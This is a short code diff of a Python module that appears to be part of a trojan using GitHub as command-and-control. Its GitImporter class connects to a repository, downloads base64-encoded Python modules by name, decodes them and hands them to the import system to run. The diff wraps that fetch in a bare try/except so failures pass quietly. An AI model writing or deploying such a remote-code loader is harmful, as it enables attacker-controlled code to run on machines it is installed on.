@@ -8,6 +8,7 @@ import threading
 import time
 
 from datetime import datetime
+import os
 
 
 def github_connect():
@@ -27,13 +28,16 @@ class GitImporter:
         self.current_module_code = ""
 
     def find_module(self, name, path=None):
-        print("[*] Attempting to retrieve %s" % name)
-        self.repo = github_connect()
+        try:
+            print("[*] Attempting to retrieve %s" % name)
+            self.repo = github_connect()
 
-        new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
-            return self
+            new_library = get_file_contents('modules', f'{name}.py', self.repo)
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        except:
+            print("[x] Failed to import " + name)
 
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None,
